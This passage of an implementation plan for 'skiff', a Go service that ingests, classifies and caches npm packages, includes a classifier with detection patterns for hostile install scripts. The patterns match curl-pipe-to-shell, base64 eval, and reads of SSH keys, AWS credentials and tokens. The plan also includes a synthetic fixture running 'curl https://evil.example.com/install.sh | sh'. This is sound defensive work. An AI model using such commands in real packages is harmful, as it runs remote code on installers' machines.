- **What the cache signature attests to:** the artifact bytes match what *this skiff worker* produced from a tarball whose integrity hash was verified against the registry's packument. No install scripts ran. The signature uses an ed25519 key whose public half is published (link to `docs/public-cache.md`).
- **What it does NOT attest to:** the source code of the package is benign, secure, or non-malicious. The classifier is a *filter*, not a security audit.
- **Threats addressed:** install-time supply-chain attacks (no preinstall/install/postinstall execution for `pure_js`), tarball tampering between registry and consumer (integrity-verified on download, signed at publish), cache pollution (signature required on every narinfo).
- **Threats not addressed:** runtime malicious code in package source, compromised registry serving a malicious tarball with a matching integrity hash, compromised skiff infra leaking the signing key, novel exfiltration patterns the classifier doesn't match.
- **Operator responsibilities:** signing key custody, key rotation cadence, monitoring for unexpected build activity.
- **Consumer responsibilities:** still review the packages you depend on; skiff's signature is a *build attestation*, not a *trust attestation*.

- [ ] **0.18 Write `docs/public-cache.md` and `docs/self-host.md` (initial skeletons)**

`docs/public-cache.md`:
- Reserved for the Phase 2+ hosted instance.
- Phase 1 placeholder: "A hosted skiff cache is planned. When it launches, its URL and substituter public key will be published here." Include a template block showing what users will eventually add to `nix.conf`.

`docs/self-host.md`:
- Operator playbook: server sizing, persistent volume considerations, key generation + rotation, monitoring metrics to watch, what to do when a build is stuck.

Both can be short stubs for M0; expand in M7.

- [ ] **0.19 Write `.github/PULL_REQUEST_TEMPLATE.md`, `.github/ISSUE_TEMPLATE/{bug,feature}.md`, `.github/dependabot.yml`**

PR template: checkboxes for "Tests added/updated", "Docs updated", "Signed-off-by present", "Conventional commit message used".

Issue templates: standard bug-report (with reproduction steps, expected vs actual, environment) and feature-request (with use case, alternatives considered).

dependabot.yml: weekly checks for `gomod`, `github-actions`, and `docker` ecosystems.

- [ ] **0.20 Commit Milestone 0**

```bash
git add LICENSE README.md CONTRIBUTING.md CODE_OF_CONDUCT.md SECURITY.md \
        docs/ deploy/ .github/ .gitignore .golangci.yml \
        flake.nix flake.lock go.mod
# (flake.nix + flake.lock were tracked earlier when M0.3 ran but may not be committed yet)
git commit -s -m "feat: bootstrap skiff repo with linux docker-compose stack, dev shell, and oss community files"
```

**Acceptance criteria for Milestone 0:**
- `nix develop --command go version` prints Go 1.23.x.
- `docker compose -f deploy/docker-compose.yml up -d && deploy/scripts/wait-for-stack.sh` returns 0 within 2 minutes from a cold start.
- ClickHouse `SHOW DATABASES` includes `skiff`.
- Garage has both `skiff-sources` and `skiff-cache` buckets and an access key visible in `garage-bootstrap` logs.
- `LICENSE`, `README.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `SECURITY.md`, `docs/threat-model.md`, `docs/public-cache.md`, `docs/self-host.md` all exist and link to each other coherently. Running `git log --format='%(trailers:key=Signed-off-by)'` shows a sign-off on every commit so far.

**Checkpoint:** stop and review with the human before starting Milestone 1.

---

## Milestone 1 — ClickHouse schema + `pkg/store`

**Goal:** A Go package that owns the canonical schema, applies migrations on startup, and exposes typed accessors used by every other package. Tests run against the live ClickHouse from compose.

**Files:**
- Create: `pkg/store/store.go`, `pkg/store/schema.go`, `pkg/store/store_test.go`
- Create: `pkg/store/migrations/0001_init.sql` (full DDL from the schema section above)
- Modify: `deploy/clickhouse-init/0001_init.sql` — keep it minimal (just `CREATE DATABASE`); the Go migration runner is now source of truth for tables.
- Create: `pkg/config/config.go`
- Create: `pkg/obs/logger.go`

### Tasks

- [ ] **1.1 Add dependencies**

```bash
go get github.com/ClickHouse/clickhouse-go/v2
go get github.com/google/uuid
```

- [ ] **1.2 Write `pkg/store/migrations/0001_init.sql`**

Paste the full DDL from the "ClickHouse schema" section above. Bundle via `embed.FS` in `schema.go`.

- [ ] **1.3 Write `pkg/store/schema.go` — embedded migrations + runner**

```go
package store

import (
    "context"
    "embed"
    "fmt"
    "sort"
    "strconv"
    "strings"
)

//go:embed migrations/*.sql
var migrationsFS embed.FS

type migration struct {
    Version int
    Name    string
    SQL     string
}

func loadMigrations() ([]migration, error) {
    entries, err := migrationsFS.ReadDir("migrations")
    if err != nil { return nil, err }
    var ms []migration
    for _, e := range entries {
        if !strings.HasSuffix(e.Name(), ".sql") { continue }
        parts := strings.SplitN(e.Name(), "_", 2)
        if len(parts) != 2 { return nil, fmt.Errorf("bad migration filename %s", e.Name()) }
        v, err := strconv.Atoi(parts[0])
        if err != nil { return nil, fmt.Errorf("bad migration version in %s: %w", e.Name(), err) }
        b, err := migrationsFS.ReadFile("migrations/" + e.Name())
        if err != nil { return nil, err }
        ms = append(ms, migration{Version: v, Name: strings.TrimSuffix(parts[1], ".sql"), SQL: string(b)})
    }
    sort.Slice(ms, func(i, j int) bool { return ms[i].Version < ms[j].Version })
    return ms, nil
}

// Migrate applies any migrations whose version > max(schema_migrations.version).
// Each migration file may contain multiple statements separated by ';\n'.
func (s *Store) Migrate(ctx context.Context) error {
    ms, err := loadMigrations()
    if err != nil { return err }
    var current uint32
    _ = s.conn.QueryRow(ctx, `SELECT max(version) FROM skiff.schema_migrations FINAL`).Scan(&current)
    for _, m := range ms {
        if uint32(m.Version) <= current { continue }
        for _, stmt := range splitStatements(m.SQL) {
            if strings.TrimSpace(stmt) == "" { continue }
            if err := s.conn.Exec(ctx, stmt); err != nil {
                return fmt.Errorf("migration %d (%s): %w", m.Version, m.Name, err)
            }
        }
        if err := s.conn.Exec(ctx,
            `INSERT INTO skiff.schema_migrations (version, description) VALUES (?, ?)`,
            m.Version, m.Name); err != nil {
            return fmt.Errorf("record migration %d: %w", m.Version, err)
        }
    }
    return nil
}

func splitStatements(sql string) []string {
    // ClickHouse driver requires one statement per Exec.
    // We split on ';\n' to avoid breaking ';' inside enums or string literals
    // — none of our migrations use those mid-statement.
    return strings.Split(sql, ";\n")
}
```

- [ ] **1.4 Write `pkg/store/store.go` — connection + typed accessors**

Define `type Store struct { conn driver.Conn }`. Constructor `Open(ctx, dsn) (*Store, error)` parses the DSN, dials, runs a ping, returns the struct. Close method. Then typed methods used by other packages:

```go
// Recorded by ingest each time the changes feed yields a new (name, version).
func (s *Store) RecordObservation(ctx context.Context, obs Observation) error
// Reads the most recently checkpointed sequence number, or 0 if none.
func (s *Store) GetChangesCheckpoint(ctx context.Context) (uint64, error)
func (s *Store) SetChangesCheckpoint(ctx context.Context, seq uint64) error

// Used by workflow activities.
func (s *Store) RecordClassification(ctx context.Context, c Classification) error
func (s *Store) GetLatestClassification(ctx context.Context, name, version string) (Classification, bool, error)

func (s *Store) RecordBuildStarted(ctx context.Context, b BuildKey) error
func (s *Store) RecordBuildSuccess(ctx context.Context, b BuildSuccess) error
func (s *Store) RecordBuildFailure(ctx context.Context, b BuildFailure) error
func (s *Store) GetLatestBuild(ctx context.Context, name, version, system, nodejs string) (Build, bool, error)

func (s *Store) RecordCachePublication(ctx context.Context, p CachePublication) error
func (s *Store) GetLatestCachePublication(ctx context.Context, name, version, system, nodejs string) (CachePublication, bool, error)

// Append-only event log.
func (s *Store) RecordEvent(ctx context.Context, e Event) error
```

Each method runs the corresponding INSERT. Reads use `FINAL`. All types defined as plain Go structs in this file.

- [ ] **1.5 Write `pkg/config/config.go`**

Single `Load()` that reads env vars into a `Config` struct, applies defaults, validates required fields, and returns the config plus a redacted slog-friendly representation for startup logs. Each binary calls `config.Load()` first thing in `main`.

- [ ] **1.6 Write `pkg/obs/logger.go`**

```go
package obs

import (
    "log/slog"
    "os"
)

func NewLogger(level string) *slog.Logger {
    var l slog.Level
    switch level {
    case "debug": l = slog.LevelDebug
    case "warn":  l = slog.LevelWarn
    case "error": l = slog.LevelError
    default:      l = slog.LevelInfo
    }
    h := slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{Level: l})
    return slog.New(h)
}
```

- [ ] **1.7 Write `pkg/store/store_test.go` — TDD: tests first, then implementation passes**

Write tests against the live compose ClickHouse. Use environment guard `SKIFF_INTEGRATION=1` to opt in; tests skipped by default in non-integration runs.

Tests to write (in this order):
1. `TestMigrate_AppliesFromScratch` — open a fresh DB (drop + recreate `skiff`), call `Migrate`, assert all expected tables present and `schema_migrations` row exists with version=1.
2. `TestMigrate_Idempotent` — call `Migrate` twice; second call is a no-op (no new rows in `schema_migrations`).
3. `TestChangesCheckpoint_RoundTrip` — set, get, set, get.
4. `TestRecordObservation_AndRead` — insert, then SELECT to confirm row.
5. `TestRecordClassification_LatestWins` — insert v1, then v2 with newer timestamp; `GetLatestClassification` returns v2.
6. `TestRecordBuildSuccess` — insert, then `GetLatestBuild` returns status=success and matching hashes.
7. `TestRecordEvent` — insert each event_type and confirm round-trip.

Verify failures first (`go test ./pkg/store -run TestMigrate_AppliesFromScratch -v`), then implement until they pass.

- [ ] **1.8 Run tests**

```bash
docker compose -f deploy/docker-compose.yml up -d
deploy/scripts/wait-for-stack.sh
CLICKHOUSE_DSN='clickhouse://default:@localhost:9000/skiff' \
  SKIFF_INTEGRATION=1 \
  go test ./pkg/store -v
```
Expected: all 7 tests pass.

- [ ] **1.9 Commit Milestone 1**

```bash
git add pkg/store pkg/config pkg/obs go.mod go.sum deploy/clickhouse-init/0001_init.sql
git commit -s -m "feat: clickhouse schema, store package, embedded migrations"
```

**Acceptance criteria for Milestone 1:**
- `go test ./pkg/store -v` with `SKIFF_INTEGRATION=1` passes all 7 tests.
- Restarting clickhouse and re-running tests still passes (idempotent migrations).
- `clickhouse-client --query 'SHOW TABLES FROM skiff'` shows all 7 tables (schema_migrations + 6 data tables).

**Checkpoint:** review schema choices, especially `ReplacingMergeTree` engine on entity tables and the `FINAL` reads pattern. This is the data model commitment.

---

## Milestone 2 — Registry client + `cmd/ingest` binary

**Goal:** A standalone binary that long-polls `https://replicate.npmjs.com/_changes`, parses change rows, fetches each new `(name, version)` packument, downloads the tarball, stores it in Garage `skiff-sources`, writes a `package_observations` row + `package_observed` event to ClickHouse, and persists the latest sequence number for resume after restart. **No Temporal yet** — that wires up in Milestone 4.

**Files:**
- Create: `pkg/registry/changes.go`, `pkg/registry/changes_test.go`
- Create: `pkg/registry/packument.go`
- Create: `pkg/registry/tarball.go`, `pkg/registry/tarball_test.go`
- Create: `cmd/ingest/main.go`
- Create: `deploy/Dockerfile.go-base`, `deploy/Dockerfile.ingest`
- Modify: `deploy/docker-compose.yml` — add `ingest` service

### Tasks

- [ ] **2.1 Add dependencies**

```bash
go get github.com/aws/aws-sdk-go-v2/config
go get github.com/aws/aws-sdk-go-v2/credentials
go get github.com/aws/aws-sdk-go-v2/service/s3
go get golang.org/x/sync/errgroup
go get github.com/prometheus/client_golang/prometheus
go get github.com/prometheus/client_golang/prometheus/promhttp
```

- [ ] **2.2 Write `pkg/registry/changes.go` — long-poll `_changes`**

```go
// ChangeRow is a single row from the npm _changes feed.
type ChangeRow struct {
    Seq    uint64 `json:"seq"`
    ID     string `json:"id"`   // package name
    Rev    string `json:"-"`
    Doc    map[string]any `json:"-"` // we don't request include_docs=true
}

// Poll opens a long-poll request to ?since=<since>&feed=longpoll&limit=<n>
// and yields rows to onRow. Returns the highest seq seen on a successful batch.
// Caller loops with the returned seq as the next since.
func Poll(ctx context.Context, client *http.Client, baseURL string, since uint64, limit int, onRow func(ChangeRow) error) (uint64, error)
```

Implementation:
- GET `<baseURL>/_changes?feed=longpoll&since=<since>&limit=<limit>&heartbeat=30000`
- Server keeps the connection open until rows arrive or 30s heartbeat fires.
- Parse JSON response `{ "results": [ {seq, id, ...}, ... ], "last_seq": N }`.
- Stream rows into `onRow`; abort and return the error if `onRow` errors.
- Return `last_seq` from the response.
- Use the `REGISTRY_USER_AGENT` header.

Backoff: caller wraps `Poll` in a loop that, on HTTP error, sleeps with exponential backoff capped at 60s; on success with zero rows, immediately re-polls (long-poll already provides the wait).

- [ ] **2.3 Test `pkg/registry/changes.go` with httptest**

Spin up a mock server that returns canned responses. Verify:
1. Empty response → returns `last_seq` unchanged, no rows.
2. Three rows → `onRow` called 3 times in order, returns `last_seq`.
3. `onRow` error → `Poll` returns the same error and the seq just before failure.
4. Server 503 → `Poll` returns a wrapped error containing the status.

- [ ] **2.4 Write `pkg/registry/packument.go`**

```go
type Packument struct {
    Name     string                       `json:"name"`
    DistTags map[string]string            `json:"dist-tags"`
    Versions map[string]PackumentVersion  `json:"versions"`
}
type PackumentVersion struct {
    Name        string `json:"name"`
    Version     string `json:"version"`
    Dist        struct {
        Tarball   string `json:"tarball"`
        Integrity string `json:"integrity"`  // e.g. "sha512-AbCdEf..." — canonical, what we verify
        SHA1Sum   string `json:"shasum"`     // legacy sha1, recorded but never used for verification
    } `json:"dist"`
}
```

(Skiff verifies *only* the `integrity` sha512 field — the legacy `shasum` sha1 is recorded for forensic value and never relied upon. If `integrity` is missing on an old packument, the activity returns a non-retryable `registry.ErrNoIntegrity` and the workflow records the observation as `broken` with that reason.)

```go
// FetchPackument GETs <baseURL>/<urlEncodedName> and parses the result.
func FetchPackument(ctx context.Context, client *http.Client, baseURL, name string) (*Packument, error)
```

- [ ] **2.5 Write `pkg/registry/tarball.go`**

```go
// DownloadTarball fetches the tarball URL, verifies the sha512 integrity matches,
// and returns the bytes and the verified sha512 hex string.
// Integrity is parsed from "sha512-<base64>" to bytes and compared to a streaming hasher.
func DownloadTarball(ctx context.Context, client *http.Client, url string, integrity string) ([]byte, string, error)
```

Streaming sha512 with `crypto/sha512`. Reject anything > 200MB (configurable later).

- [ ] **2.6 Test `pkg/registry/tarball.go`**

httptest server returning a known body. Pass the correct integrity → success, hex matches. Pass a wrong integrity → returns specific `ErrIntegrityMismatch` error. Test 404 path.

- [ ] **2.7 Write `cmd/ingest/main.go`**

Pseudocode:
```
cfg := config.Load()
log := obs.NewLogger(cfg.LogLevel)
store := store.Open(ctx, cfg.ClickHouseDSN)
store.Migrate(ctx)
s3 := newS3Client(cfg)

go servePrometheus(cfg.MetricsAddr)

since := store.GetChangesCheckpoint(ctx)
for {
  last_seq := registry.Poll(ctx, http, cfg.RegistryURL, since, 500, func(row) {
    handleChange(ctx, row)   // see below
    return nil
  })
  store.SetChangesCheckpoint(ctx, last_seq)
  since = last_seq
}
```

`handleChange`:
1. `packument := registry.FetchPackument(ctx, http, cfg.RegistryURL, row.ID)`
2. For each *new* version in the packument (deduped per `(name, version)` we've already observed — quick existence check via `package_observations`):
   1. Download tarball, verify integrity.
   2. PutObject to S3 `sources/<sha512>/<name>-<version>.tgz`.
   3. `store.RecordObservation(...)` with all fields.
   4. `store.RecordEvent(ctx, Event{Type: "package_observed", Name, Version, Payload})`.

Concurrency: bound version processing per change row at 4 with errgroup. Keep this conservative for Phase 1.

Prometheus counters: `skiff_ingest_changes_rows_total`, `skiff_ingest_versions_observed_total{result=...}`, `skiff_ingest_tarball_bytes_total`.

- [ ] **2.8 Write `deploy/Dockerfile.go-base`**

```dockerfile
# syntax=docker/dockerfile:1.7
FROM golang:1.23-bookworm AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN --mount=type=cache,target=/go/pkg/mod go mod download
COPY . .
ARG BIN
RUN --mount=type=cache,target=/go/pkg/mod \
    --mount=type=cache,target=/root/.cache/go-build \
    CGO_ENABLED=0 GOOS=linux go build -trimpath -ldflags="-s -w" \
      -o /out/${BIN} ./cmd/${BIN}
```

- [ ] **2.9 Write `deploy/Dockerfile.ingest`**

```dockerfile
# syntax=docker/dockerfile:1.7
FROM golang:1.23-bookworm AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN --mount=type=cache,target=/go/pkg/mod go mod download
COPY . .
RUN --mount=type=cache,target=/go/pkg/mod \
    --mount=type=cache,target=/root/.cache/go-build \
    CGO_ENABLED=0 GOOS=linux go build -trimpath -ldflags="-s -w" \
      -o /out/ingest ./cmd/ingest

FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=build /out/ingest /usr/local/bin/ingest
USER nonroot
ENTRYPOINT ["/usr/local/bin/ingest"]
```

(Resolver Dockerfile in Milestone 6 follows the same pattern. We're not deduplicating into a shared base yet — it costs more than it saves at three binaries.)

- [ ] **2.10 Add `ingest` and `garage-bootstrap` env wiring to `docker-compose.yml`**

```yaml
  ingest:
    <<: *platform
    build:
      context: ..
      dockerfile: deploy/Dockerfile.ingest
    depends_on:
      clickhouse: { condition: service_healthy }
      garage: { condition: service_healthy }
      garage-bootstrap: { condition: service_completed_successfully }
    networks: [skiff]
    environment:
      CLICKHOUSE_DSN: "clickhouse://default:@clickhouse:9000/skiff"
      S3_ENDPOINT: "http://garage:3900"
      S3_REGION: "garage"
      S3_BUCKET_SOURCES: "skiff-sources"
      REGISTRY_URL: "https://replicate.npmjs.com"
      REGISTRY_USER_AGENT: "skiff-ingest/0.1 (+contact@example.invalid)"
      LOG_LEVEL: "info"
      LISTEN_ADDR: ":9090"
    env_file: ["./scripts/skiff-keys.env"]   # written by bootstrap; gitignored
    ports: ["9091:9090"]
```

(We adjust bootstrap to write the env file to `./scripts/skiff-keys.env` instead of inside the volume; symlink or mount adjustment as needed.)

- [ ] **2.11 Smoke test ingest end-to-end**

```bash
docker compose -f deploy/docker-compose.yml up -d --build ingest
sleep 30
docker compose -f deploy/docker-compose.yml exec clickhouse \
  clickhouse-client --query 'SELECT count(*) FROM skiff.package_observations'
```
Expected: a non-zero count within 30 seconds (npm publishes constantly).

```bash
docker compose -f deploy/docker-compose.yml exec ingest \
  /usr/local/bin/ingest --help || true  # process is running, can't exec into distroless;
# instead:
docker compose -f deploy/docker-compose.yml logs ingest | head -50
```

Verify tarballs landed in Garage:
```bash
docker compose exec garage /garage -c /etc/garage.toml bucket info skiff-sources
```

- [ ] **2.12 Commit Milestone 2**

```bash
git add pkg/registry cmd/ingest deploy/Dockerfile.* deploy/docker-compose.yml deploy/scripts/
git commit -s -m "feat: registry client and ingest binary streaming into clickhouse + garage"
```

**Acceptance criteria for Milestone 2:**
- `docker compose up -d --build` (from cold) results in `package_observations` filling within 30 seconds.
- Restart `ingest` container; verify `ingest_state.value` for `changes_feed_seq` increased and ingest resumed from that point (no duplicate observations of the same `(name, version)` pair in `package_observations` — confirm by counting distinct `(name, version)` vs total rows).
- `skiff-sources` bucket contains tarballs (verify with `aws s3 ls --endpoint-url http://localhost:3900 s3://skiff-sources/`).

**Checkpoint:** review ingest behavior under load, look at the rate of `package_observations` writes. Decide whether the 4-version concurrency limit is right.

---

## Milestone 3 — Classifier

**Goal:** A pure Go package that, given a downloaded tarball and a packument version, returns a `Classification` with the matched rule's name and a human-readable reason. Fixture-based unit tests cover each of the six classes.

**Files:**
- Create: `pkg/classify/classify.go`, `pkg/classify/rules.go`, `pkg/classify/rules_test.go`
- Create: `pkg/classify/testdata/{pure-js,has-lifecycle,has-native,fetches-at-install,suspicious,broken}/*.tgz`
- Create: `docs/classification.md`

### Tasks

- [ ] **3.1 Define the API**

```go
// pkg/classify/classify.go
package classify

import "io"

type Class string
const (
    ClassBroken             Class = "broken"
    ClassSuspicious         Class = "suspicious"
    ClassHasNativeCode      Class = "has_native_code"
    ClassFetchesAtInstall   Class = "fetches_at_install"
    ClassHasLifecycleScript Class = "has_lifecycle_script"
    ClassPureJS             Class = "pure_js"
)

type Classification struct {
    Class       Class
    Reason      string
    RuleMatched string  // e.g. "suspicious.curl_pipe_sh", "native.binding_gyp"
    Version     string  // classifier_version constant, bumped when rules change
}

const Version = "0.1.0"

// Classify reads the tarball stream once, materializing a tar.Header + small file
// contents to memory. Returns the highest-precedence matching class.
// `extra` carries the parsed package.json from inside the tarball (filled by the
// caller after the tarball has been walked; classify also walks internally to
// detect tarball-content rules).
func Classify(tarball io.Reader) (Classification, error)
```

Internal helpers:
- `unpack(reader) (map[string][]byte, *PackageJSON, error)` — gunzip+untar, capture small text files into a map; bail on anything that doesn't unpack.
- `PackageJSON` struct with the fields we care about: `Scripts map[string]string`, `BinaryGyp *bool`, etc.

- [ ] **3.2 Write `pkg/classify/rules.go` — five rules in precedence order**

Rule signatures:
```go
func ruleBroken(files map[string][]byte, pkg *PackageJSON, unpackErr error) (Classification, bool)
func ruleSuspicious(files map[string][]byte, pkg *PackageJSON) (Classification, bool)
func ruleHasNativeCode(files map[string][]byte) (Classification, bool)
func ruleFetchesAtInstall(pkg *PackageJSON) (Classification, bool)
func ruleHasLifecycleScript(pkg *PackageJSON) (Classification, bool)
```

`Classify` calls them in order; first match wins; if none match, returns `pure_js`.

Detailed rule content:

**Broken:**
- `unpackErr != nil`, OR
- `package.json` missing, OR
- `package.json` fails `json.Unmarshal`, OR
- Required field `name` is empty.

Reason: "tarball failed to unpack: ..." | "package.json missing" | "package.json invalid JSON: ..." | "package.json missing name".

**Suspicious:** any install script (`preinstall`, `install`, `postinstall`) contains *any* of:
- Regex `curl\s+[^|]*\|\s*(sudo\s+)?sh` (matches `curl ... | sh`, `curl -L https://x | sh`)
- Regex `wget\s+[^|]*\|\s*(sudo\s+)?sh`
- `eval\s*\(\s*(atob|Buffer\.from)\s*\(` (base64-then-exec)
- Literal `/etc/passwd`, `/etc/shadow`, `~/.ssh`, `~/.aws`, `$HOME/.ssh`, `$HOME/.aws`
- Env-var references: `\$\{?(AWS_[A-Z_]+|GITHUB_TOKEN|GH_TOKEN|NPM_TOKEN|GITLAB_TOKEN|DOCKER_PASSWORD|KUBE_TOKEN)\}?`

Set `RuleMatched` to e.g. `suspicious.curl_pipe_sh`, `suspicious.exfil_env_var`. Reason includes the offending script name and a short excerpt.

**HasNativeCode:** any of:
- File `binding.gyp` present at root.
- Any file matches `**/*.{node,c,cc,cpp,cxx,m,mm,h,hpp}`.

Reason includes the matching path.

**FetchesAtInstall:** install scripts (any of preinstall/install/postinstall) contain *any* of:
- `node-pre-gyp`, `@mapbox/node-pre-gyp`, `prebuild-install`.
- Literal `http://` or `https://` (after stripping `# comments`).

(`pure_js` packages legitimately can have `http://` in *test* or *build* scripts, but Phase 1 scope is install-time scripts only.)

**HasLifecycleScript:** package.json has any of preinstall/install/postinstall set to a non-empty string.

**Default:** `pure_js`, reason "no lifecycle scripts, no native files, no install-time fetches".

- [ ] **3.3 Collect fixture tarballs**

Use known-real packages:
- `pure-js/`: `is-array-1.0.1.tgz`, `left-pad-1.3.0.tgz`
- `has-lifecycle/`: pick a small package with a postinstall that just `echo`s (the rule still fires)
- `has-native/`: `bcrypt-5.x.tgz` (has binding.gyp), or a minimal hand-built tarball with a stub `binding.gyp`
- `fetches-at-install/`: `node-sass-7.x.tgz` (uses node-pre-gyp) or any prebuild-install package
- `suspicious/`: hand-craft a 3-file tarball whose `package.json` postinstall is `curl https://evil.example.com/install.sh | sh`. We do **not** ship real malware; minimal synthetic content marked clearly under `testdata/suspicious/README.txt`.
- `broken/`: a malformed gzip file (truncated), and a separate one with a bogus `package.json` (e.g. `{not json`).

Generate hand-built fixtures with a script `pkg/classify/testdata/build-fixtures.sh` so anyone can regenerate from source.

- [ ] **3.4 Write fixture-driven tests**

```go
func TestClassify_PureJS_LeftPad(t *testing.T) {
    f, _ := os.Open("testdata/pure-js/left-pad-1.3.0.tgz")
    defer f.Close()
    got, err := Classify(f)
    require.NoError(t, err)
    require.Equal(t, ClassPureJS, got.Class)
}
// Similar for each class, one or two fixtures each.
```

Plus a table-driven "negative" test that asserts each rule does NOT fire when its preconditions are absent. E.g., a `binding.gyp` reference inside a regular .md file does not trigger HasNativeCode (only actual file presence does).

Run TDD: write a failing test for the simplest rule, implement, run, commit, move on.

- [ ] **3.5 Write `docs/classification.md`**

A user-facing doc: list the six classes in precedence order, the exact rules, examples of borderline cases. Link from `docs/architecture.md`.

- [ ] **3.6 Run all classifier tests**

```bash
go test ./pkg/classify -v
```
Expected: 100% pass, every class covered by at least one fixture.

- [ ] **3.7 Commit Milestone 3**

```bash
git add pkg/classify docs/classification.md
git commit -s -m "feat: classifier with five rules and fixture-driven tests"
```

**Acceptance criteria for Milestone 3:**
- All classifier tests pass.
- `Classify` returns the expected class for every fixture in `testdata/`.
- The classifier has zero non-stdlib dependencies (it's pure logic).

**Checkpoint:** review the suspicious regex set with the human; this is the rule most likely to be wrong in either direction (false positive on `curl` in a CI script, false negative on novel exfil patterns). Phase 2 will likely refine.

---

## Milestone 4 — Temporal workflows + `cmd/worker` binary

**Goal:** Replace ingest's inline `handleChange` with `StartWorkflow(ProcessPackage)` calls. Implement the workflow + activities, register them in a worker process, and verify a new observation flows through classification end-to-end. **Building is stubbed** at this milestone — the workflow stops after classification.

**Files:**
- Create: `pkg/workflows/process.go`, `pkg/workflows/activities.go`, `pkg/workflows/workflows_test.go`
- Create: `cmd/worker/main.go`
- Create: `deploy/Dockerfile.worker` (initial — Nix wiring lands in M5)
- Modify: `deploy/docker-compose.yml` — add `worker` service
- Modify: `cmd/ingest/main.go` — switch from inline handling to `StartWorkflow`

### Tasks

- [ ] **4.1 Add Temporal SDK**

```bash
go get go.temporal.io/sdk
```

- [ ] **4.2 Define the workflow contract in `pkg/workflows/process.go`**

```go
type ProcessPackageInput struct {
    Name          string
    Version       string
    TarballURL    string
    Integrity     string  // sha512-... from packument
    RegistrySeq   uint64
    PackumentRev  string
}

// ProcessPackage(ctx, input):
//   1. FetchAndStoreSourceActivity → FetchResult{s3Key, sha512Hex, sizeBytes}
//      (single activity: streams download from npm into S3 multipart upload,
//      verifies sha512 inline. No raw bytes returned.)
//   2. RecordObservationActivity (writes package_observations row)
//   3. ClassifyActivity(s3Key) → Classification (streams from S3)
//   4. RecordClassificationActivity (idempotent insert into clickhouse)
//   5. if Classification.Class == "pure_js":
//        ExecuteChildWorkflow(BuildPackage, ...)
//      else:
//        return (skip + reason)
func ProcessPackage(ctx workflow.Context, in ProcessPackageInput) (ProcessPackageResult, error)
```

`BuildPackage` is declared but its body is a stub for this milestone — returns "not implemented in M4" so the workflow completes cleanly.

- [ ] **4.3 Implement activities in `pkg/workflows/activities.go`**

Each activity is a method on an `Activities` struct that holds the store, S3 client, http client, and config. Activities:
- `FetchAndStoreSource(ctx, name, version, url, integrity) (FetchResult, error)` — streams the tarball from the registry through a `crypto/sha512` hasher and directly into an S3 multipart upload to `skiff-sources/<sha512>/<name>-<version>.tgz`. Returns `FetchResult{S3Key, SHA512Hex, SizeBytes}`. Idempotent: HEAD the target key first, skip the upload if the object exists with matching size. **No raw tarball bytes ever travel through a Temporal payload** — npm tarballs routinely exceed the 4MB gRPC limit and Phase 1 caps at 200MB. The previous draft of this plan had two activities passing `[]byte`; the merged variant is the only correct shape.
- `Classify(ctx, s3Key) (Classification, error)` — streams the object from S3 and calls `classify.Classify` on the reader directly (no intermediate buffer larger than necessary). Returns a `Classification` (small struct, payload-safe).
- `RecordClassification(ctx, name, version, Classification) error`
- `RecordObservation(ctx, ProcessPackageInput, FetchResult) error` (called at the start of ProcessPackage)
- `RecordEvent(ctx, Event) error`

Activity options:
- StartToCloseTimeout: 10 minutes for `FetchAndStoreSource` (large tarballs over slow links), 2 minutes for classify, 5 seconds for record-*.
- HeartbeatTimeout: 1 minute on `FetchAndStoreSource`; the activity heartbeats every 5 MB of streamed bytes so a stuck download is detected without waiting for the full StartToClose budget.
- RetryPolicy: max 5 attempts, initial 1s, backoff 2.0, max 30s. Non-retryable error types: `classify.ErrUnclassifiable` (we don't have one yet but reserve the slot) and `registry.ErrIntegrityMismatch` (a hash mismatch is not transient).

- [ ] **4.4 Write `cmd/worker/main.go`**

```
cfg := config.Load()
log := obs.NewLogger(cfg.LogLevel)
store := store.Open(ctx, cfg.ClickHouseDSN); store.Migrate(ctx)
s3 := newS3Client(cfg)
tc := temporalclient.Dial(cfg.TemporalHost, cfg.TemporalNamespace)
w := worker.New(tc, cfg.TemporalTaskQueue, worker.Options{
    MaxConcurrentWorkflowTaskExecutionSize: 100,
    MaxConcurrentActivityExecutionSize:     50,
})
acts := &workflows.Activities{Store: store, S3: s3, HTTP: http, Cfg: cfg}
w.RegisterWorkflow(workflows.ProcessPackage)
w.RegisterWorkflow(workflows.BuildPackage)
w.RegisterActivity(acts.FetchAndStoreSource)
w.RegisterActivity(acts.Classify)
w.RegisterActivity(acts.RecordObservation)
w.RegisterActivity(acts.RecordClassification)
w.RegisterActivity(acts.RecordEvent)
// BuildPackage activities (full implementations land in M5; stubs registered now so the worker boots):
w.RegisterActivity(acts.PrepareBuildContext)
w.RegisterActivity(acts.NixBuild)
w.RegisterActivity(acts.CaptureNar)
w.RegisterActivity(acts.SignAndUpload)
w.RegisterActivity(acts.RecordBuild)
w.RegisterActivity(acts.RecordCachePublication)
go servePrometheus(cfg.MetricsAddr)
w.Run(worker.InterruptCh())
```

- [ ] **4.5 Modify `cmd/ingest/main.go`**

Replace the inline `handleChange` body with: open a Temporal client at startup, and for each new `(name, version)` in a change row, call `client.ExecuteWorkflow(ctx, opts, ProcessPackage, input)` with:
- WorkflowID `process:<name>@<version>` (deterministic, idempotent — Temporal dedups).
- WorkflowIDReusePolicy: `WORKFLOW_ID_REUSE_POLICY_ALLOW_DUPLICATE_FAILED_ONLY` (so successful runs don't get re-fired).
- TaskQueue `skiff-default`.

Don't await the result — the workflow runs async. Record the start in the event log via `RecordEvent("ingest_checkpoint", ...)` instead.

- [ ] **4.6 Write workflow tests using Temporal testsuite**

```go
func TestProcessPackage_PureJS_StartsBuild(t *testing.T) {
    ts := testsuite.WorkflowTestSuite{}
    env := ts.NewTestWorkflowEnvironment()
    env.OnActivity(acts.FetchAndStoreSource, ...).Return(
        workflows.FetchResult{S3Key: "sources/deadbeef/foo-1.0.0.tgz", SHA512Hex: "deadbeef...", SizeBytes: 1234}, nil)
    env.OnActivity(acts.RecordObservation, ...).Return(nil)
    env.OnActivity(acts.Classify, ...).Return(classify.Classification{Class: classify.ClassPureJS}, nil)
    env.OnActivity(acts.RecordClassification, ...).Return(nil)
    env.ExecuteWorkflow(workflows.ProcessPackage, ProcessPackageInput{Name: "foo", Version: "1.0.0", ...})
    require.True(t, env.IsWorkflowCompleted())
    require.NoError(t, env.GetWorkflowError())
}
```
